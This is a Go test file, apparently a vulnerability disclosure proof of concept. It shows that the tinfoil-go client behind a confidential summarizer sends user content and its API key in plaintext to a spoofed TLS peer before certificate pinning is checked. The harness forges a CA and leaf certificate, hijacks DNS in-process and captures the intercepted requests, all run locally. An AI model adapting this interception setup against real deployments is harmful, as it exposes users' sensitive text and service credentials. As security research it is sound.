package main

// Tightened PoC (local only; DNS is answered in-process and every name other
// than inference.tinfoil.sh is NXDOMAIN, so there is no egress).
//
// Differences from the original hunt PoC (which hand-built a verifier
// TLSBoundRoundTripper, used an IP-literal base URL and called
// upstream.Summarize directly):
//   - the client is built by tinfoil-go v0.11.3's real, unexported
//     createClientFromSecureClient (tinfoil_client.go:91-118), so the real
//     reVerifyingTransport -> verifier v0.11.2 SecureClient.HTTPClient() ->
//     TLSBoundRoundTripper -> http.DefaultTransport chain and the real base
//     URL https://inference.tinfoil.sh/v1/ are used; http.DefaultTransport is
//     NOT modified;
//   - the end-user request enters through the summarizer's real HTTP handler
//     (summaryService.ServeHTTP) wired exactly as main.go:39-42 does;
//   - the attacker withholds its response, showing the whole plaintext
//     request is in the attacker's hands while the client is still inside
//     http.DefaultTransport.RoundTrip, i.e. before any pin check has run.
//
// Simulated pieces (nothing in the summarizer/SDK code is modified):
//  1. the outcome of a successful startup Verify(): groundTruth.TLSPublicKey =
//     fingerprint of the genuine router enclave key (verifier client.go:220-230);
//  2. the attacker's publicly trusted certificate for inference.tinfoil.sh: a
//     test CA is installed as the system trust store via SSL_CERT_FILE;
//  3. DNS for inference.tinfoil.sh answered with the attacker's address
//     (an attacker controlling the enclave host's DNS/routing).
//
// Run: go test -count=1 -run 'TestTightPoC' -v .

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"
	"unsafe"

	"github.com/openai/openai-go/v3/option"
	"github.com/sirupsen/logrus"
	tinfoil "github.com/tinfoilsh/tinfoil-go"
	"github.com/tinfoilsh/verifier/attestation"
	verifierclient "github.com/tinfoilsh/verifier/client"

	"github.com/tinfoilsh/confidential-summarizer/config"
)

//go:linkname tinfoilCreateClient github.com/tinfoilsh/tinfoil-go.createClientFromSecureClient
func tinfoilCreateClient(secureClient *verifierclient.SecureClient, openaiOpts ...option.RequestOption) (*tinfoil.Client, error)

const routerHost = fakeRouterHost // "inference.tinfoil.sh", verifier v0.11.2 client.go:52

var tightCA struct {
	cert *x509.Certificate
	key  *ecdsa.PrivateKey
}

func TestMain(m *testing.M) {
	// (2) "publicly trusted" CA = the process's system trust store.
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "PoC Public Root CA"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	tightCA.cert, _ = x509.ParseCertificate(der)
	tightCA.key = key
	dir, _ := os.MkdirTemp("", "poc-tight-ca")
	path := filepath.Join(dir, "ca.pem")
	if err := os.WriteFile(path, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600); err != nil {
		panic(err)
	}
	os.Setenv("SSL_CERT_FILE", path)
	os.Setenv("SSL_CERT_DIR", dir)

	// (3) attacker-controlled DNS; also the egress block.
	installFakeDNS()

	code := m.Run()
	os.RemoveAll(dir)
	os.Exit(code)
}

func attackerLeaf(t *testing.T) (tls.Certificate, string) {
	t.Helper()
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: routerHost},
		DNSNames:     []string{routerHost},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tightCA.cert, &key.PublicKey, tightCA.key)
	if err != nil {
		t.Fatal(err)
	}
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}, attestation.KeyFP(&key.PublicKey)
}

// startAttacker serves TLS for inference.tinfoil.sh on 127.11.22.33:443.
func startAttacker(t *testing.T, h http.Handler) (*httptest.Server, string) {
	t.Helper()
	l, err := net.Listen("tcp", fmt.Sprintf("%d.%d.%d.%d:443", attackerIP[0], attackerIP[1], attackerIP[2], attackerIP[3]))
	if err != nil {
		t.Fatal(err)
	}
	leaf, fp := attackerLeaf(t)
	s := httptest.NewUnstartedServer(h)
	s.Listener.Close()
	s.Listener = l
	s.TLS = &tls.Config{Certificates: []tls.Certificate{leaf}}
	s.EnableHTTP2 = os.Getenv("POC_H2") == "1" // the real router's Go TLS server negotiates h2 via ALPN
	s.StartTLS()
	return s, fp
}

// setGroundTruth simulates a successful SecureClient.Verify() (client.go:220-230).
func setGroundTruth(sc *verifierclient.SecureClient, gt *verifierclient.GroundTruth) {
	f := reflect.ValueOf(sc).Elem().FieldByName("groundTruth")
	reflect.NewAt(f.Type(), unsafe.Pointer(f.UnsafeAddr())).Elem().Set(reflect.ValueOf(gt))
}

func newRealSummarizerClient(t *testing.T, apiKey, pinnedFP string) *tinfoil.Client {
	t.Helper()
	sc := verifierclient.NewSecureClient(routerHost, "tinfoilsh/confidential-model-router")
	setGroundTruth(sc, &verifierclient.GroundTruth{EnclaveHost: routerHost, TLSPublicKey: pinnedFP})
	// Real tinfoil-go v0.11.3 construction with the summarizer's real options (upstream.go:45-54).
	tc, err := tinfoilCreateClient(sc, openAIClientOptions(apiKey)...)
	if err != nil {
		t.Fatal(err)
	}
	return tc
}

type capturedReq struct {
	remote, host, method, path, auth, body, proto string
	tlsVersion                                    uint16
}

func TestTightPoC(t *testing.T) {
	// The genuine router enclave key; attestation would pin its fingerprint.
	enclaveKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pinnedFP := attestation.KeyFP(&enclaveKey.PublicKey)

	captured := make(chan capturedReq, 8)
	release := make(chan struct{})
	var requests int
	var reqMu sync.Mutex
	mitm, attackerFP := startAttacker(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		reqMu.Lock()
		requests++
		reqMu.Unlock()
		captured <- capturedReq{remote: r.RemoteAddr, host: r.Host, method: r.Method, path: r.URL.Path, auth: r.Header.Get("Authorization"), body: string(b), tlsVersion: r.TLS.Version, proto: r.Proto}
		<-release // withhold the response: the client is still blocked in RoundTrip
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"id":"x","object":"chat.completion","created":0,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"Attacker chosen title"}}]}`)
	}))
	defer mitm.Close()

	tc := newRealSummarizerClient(t, "SUMMARIZER-TINFOIL-API-KEY", pinnedFP)
	t.Logf("tinfoil.Client built by tinfoil-go v0.11.3 createClientFromSecureClient: enclave=%s repo=%s", tc.Enclave(), tc.Repo())

	// Real summarizer wiring (main.go:39-42).
	upstream := newOpenAIUpstream(tc.Client, config.DefaultModel)
	logger := logrus.New()
	logger.SetOutput(io.Discard)
	service := newSummaryService(upstream, defaultUpstreamTimeout, logger)
	mux := http.NewServeMux()
	mux.Handle("/summarize", service)
	front := httptest.NewServer(mux)
	defer front.Close()

	// End-user request, shaped like the webapp's title request (summary-client.ts:31-35, title.ts:50-53).
	secret := "I was diagnosed with HIV yesterday, how do I tell my employer"
	userBody, _ := json.Marshal(map[string]string{"content": secret, "style": "title_summary"})
	type result struct {
		status int
		body   string
		err    error
	}
	done := make(chan result, 1)
	go func() {
		resp, err := http.Post(front.URL+"/summarize", "application/json", strings.NewReader(string(userBody)))
		if err != nil {
			done <- result{err: err}
			return
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		done <- result{status: resp.StatusCode, body: string(b)}
	}()

	var got capturedReq
	select {
	case got = <-captured:
	case <-time.After(15 * time.Second):
		t.Fatal("interceptor received nothing")
	}
	// The attacker already holds the full plaintext; confirm the client has not returned.
	time.Sleep(300 * time.Millisecond)
	select {
	case r := <-done:
		t.Fatalf("summarizer finished before the attacker responded: %+v", r)
	default:
	}
	t.Logf("pinned (attested) key FP : %s", pinnedFP)
	t.Logf("attacker cert key FP     : %s", attackerFP)
	t.Logf("[attacker %s, response withheld] %s %s%s (%s, TLS 0x%04x, from %s)", mitm.Listener.Addr(), got.method, got.host, got.path, got.proto, got.tlsVersion, got.remote)
	t.Logf("[attacker, response withheld] Authorization: %q", got.auth)
	t.Logf("[attacker, response withheld] body: %s", got.body)
	t.Log("summarizer's upstream call is still pending -> the pin check has not run yet")

	close(release)
	var r result
	select {
	case r = <-done:
	case <-time.After(15 * time.Second):
		t.Fatal("summarizer did not return")
	}
	t.Logf("end user received: status=%d body=%s err=%v", r.status, strings.TrimSpace(r.body), r.err)
	for _, d := range dnsLogSnapshot() {
		t.Logf("resolver: %s", d)
	}
	reqMu.Lock()
	t.Logf("interceptor saw %d request(s) in total", requests)
	reqMu.Unlock()

	if got.host != routerHost || got.path != "/v1/chat/completions" {
		t.Fatalf("unexpected target %s%s", got.host, got.path)
	}
	if !strings.Contains(got.body, secret) {
		t.Fatal("interceptor did not receive the user content")
	}
	if got.auth != "Bearer SUMMARIZER-TINFOIL-API-KEY" {
		t.Fatal("interceptor did not receive the summarizer API key")
	}
	if r.status != http.StatusServiceUnavailable || strings.Contains(r.body, "Attacker chosen title") {
		t.Fatalf("expected the summarizer to reject the response after the fact, got %d %s", r.status, r.body)
	}
	t.Log("VULNERABLE: plaintext summarize request (user content + TINFOIL_API_KEY) delivered to a non-attested TLS peer; pin mismatch detected only afterwards")
}

// TestTightPoCErrorType shows the error the real client chain returns (the
// service maps it to 503) and that the leak repeats on every request.
func TestTightPoCErrorType(t *testing.T) {
	enclaveKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pinnedFP := attestation.KeyFP(&enclaveKey.PublicKey)
	var mu sync.Mutex
	var bodies []string
	mitm, _ := startAttacker(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		bodies = append(bodies, string(b))
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"id":"x","object":"chat.completion","created":0,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"t"}}]}`)
	}))
	defer mitm.Close()

	tc := newRealSummarizerClient(t, "K", pinnedFP)
	upstream := newOpenAIUpstream(tc.Client, config.DefaultModel)
	for i := 0; i < 3; i++ {
		_, err := upstream.Summarize(context.Background(), summaryInput{
			Content: fmt.Sprintf("secret reasoning #%d", i), Style: config.Styles["thoughts_summary"], MinWords: 4, MaxWords: 12, MaxTokens: 64,
		})
		t.Logf("request %d: client error = %v (errors.Is ErrCertMismatch: %v)", i, err, errors.Is(err, verifierclient.ErrCertMismatch))
	}
	mu.Lock()
	defer mu.Unlock()
	for i, b := range bodies {
		t.Logf("interceptor body %d contains %q: %v", i, fmt.Sprintf("secret reasoning #%d", i), strings.Contains(b, fmt.Sprintf("secret reasoning #%d", i)))
	}
	if len(bodies) != 3 {
		t.Fatalf("expected 3 leaked requests, got %d", len(bodies))
	}
}
